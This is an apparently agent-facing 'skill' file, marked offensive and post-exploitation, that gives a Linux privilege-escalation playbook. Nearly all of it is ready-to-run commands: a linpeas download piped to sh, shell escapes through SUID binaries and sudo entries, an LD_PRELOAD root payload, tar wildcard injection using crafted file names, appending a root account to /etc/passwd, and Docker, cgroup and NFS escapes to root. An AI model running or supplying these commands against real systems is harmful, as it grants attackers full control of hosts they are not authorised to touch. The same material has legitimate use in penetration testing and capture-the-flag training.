---
name: privesc-linux
description: Linux privilege escalation — SUID/SGID abuse, kernel exploits, capabilities, sudo misconfig, cron jobs, writable paths, container escape
metadata:
  type: offensive
  phase: post-exploitation
  tools: linpeas, pspy, gtfobins, linux-exploit-suggester
---

# Linux Privilege Escalation

## When to Activate

- Gained initial shell on Linux target, need root
- Post-exploitation privilege escalation
- Container escape scenarios
- CTF challenges requiring privesc

## Automated Enumeration

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# pspy (process monitoring without root)
./pspy64
```

## Manual Enumeration

### System Info
```bash
uname -a                    # Kernel version
cat /etc/os-release         # OS version
id                          # Current user/groups
env                         # Environment variables
cat /etc/passwd             # Users
cat /etc/crontab            # Cron jobs
ls -la /etc/cron*           # All cron directories
mount                       # Mounted filesystems
df -h                       # Disk usage
ip addr / ifconfig          # Network interfaces
netstat -tulpn / ss -tulpn  # Listening services
ps aux                      # Running processes
```

### SUID/SGID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# Check GTFOBins for each:
# https://gtfobins.github.io/#+suid
# Common exploitable SUID:
# - /usr/bin/find → find . -exec /bin/sh -p \;
# - /usr/bin/vim → vim -c ':!/bin/sh'
# - /usr/bin/python3 → python3 -c 'import os;os.execl("/bin/sh","sh","-p")'
# - /usr/bin/env → env /bin/sh -p
# - /usr/bin/nmap (old) → nmap --interactive → !sh
```

### Capabilities
```bash
getcap -r / 2>/dev/null

# Exploitable capabilities:
# cap_setuid+ep → set UID to 0
#   python3: python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
# cap_dac_read_search → read any file
# cap_net_raw → packet sniffing
# cap_sys_admin → mount filesystems, abuse cgroups
# cap_sys_ptrace → inject into processes
```

### Sudo
```bash
sudo -l  # List allowed commands

# Exploitable sudo entries:
# (ALL) NOPASSWD: /usr/bin/vim → :!/bin/sh
# (ALL) NOPASSWD: /usr/bin/less → !/bin/sh
# (ALL) NOPASSWD: /usr/bin/awk → awk 'BEGIN {system("/bin/sh")}'
# (ALL) NOPASSWD: /usr/bin/find → find . -exec /bin/sh \;
# (ALL) NOPASSWD: /usr/bin/python3 → python3 -c 'import pty;pty.spawn("/bin/bash")'
# (ALL) NOPASSWD: /usr/bin/env → env /bin/sh
# (ALL) NOPASSWD: /usr/bin/perl → perl -e 'exec "/bin/sh"'

# LD_PRELOAD (if env_keep+=LD_PRELOAD in sudoers)
# Compile: gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
# pe.c: void _init() { setuid(0); system("/bin/bash -p"); }
# sudo LD_PRELOAD=/tmp/pe.so /allowed/command
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l
# Check for writable scripts called by root cron
# Check for wildcard injection (tar, rsync with *)

# Wildcard injection (tar):
# If cron runs: tar czf /backup/backup.tar.gz *
# Create: --checkpoint=1 --checkpoint-action=exec=sh shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > shell.sh
```

### Writable Files/Paths
```bash
# Writable /etc/passwd
echo 'hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash' >> /etc/passwd

# Writable service files
find /etc/systemd/system -writable -type f 2>/dev/null
# Modify ExecStart to reverse shell

# Writable PATH directories
echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable -type d 2>/dev/null
# Place malicious binary with name of command run by root

# Writable library paths
find / -writable -name "*.so" 2>/dev/null
ldconfig -v 2>/dev/null | grep -v "^$"
```

### Kernel Exploits
```bash
uname -r
# Search: searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# Notable kernel exploits:
# DirtyPipe (CVE-2022-0847) — Linux 5.8-5.16.11
# DirtyCow (CVE-2016-5195) — Linux 2.6.22-4.8.3
# PwnKit (CVE-2021-4034) — pkexec, almost all Linux
# Sequoia (CVE-2021-33909) — filesystem layer, most kernels
# GameOver(lay) (CVE-2023-2640) — Ubuntu OverlayFS
```

### Docker/Container Escape
```bash
# Check if in container
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv

# Docker socket mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Privileged container
fdisk -l  # can see host disks
mount /dev/sda1 /mnt && chroot /mnt

# Cap SYS_ADMIN + apparmor=unconfined
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
# Then abuse release_agent for host command execution

# CVE-2019-5736 (runc overwrite)
# Overwrite /usr/bin/runc on host via /proc/self/exe
```

### NFS
```bash
showmount -e $TARGET
# If no_root_squash is set:
# Mount share, create SUID binary as root, execute on target
mount -t nfs $TARGET:/share /mnt
cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash
# On target: /share/rootbash -p
```
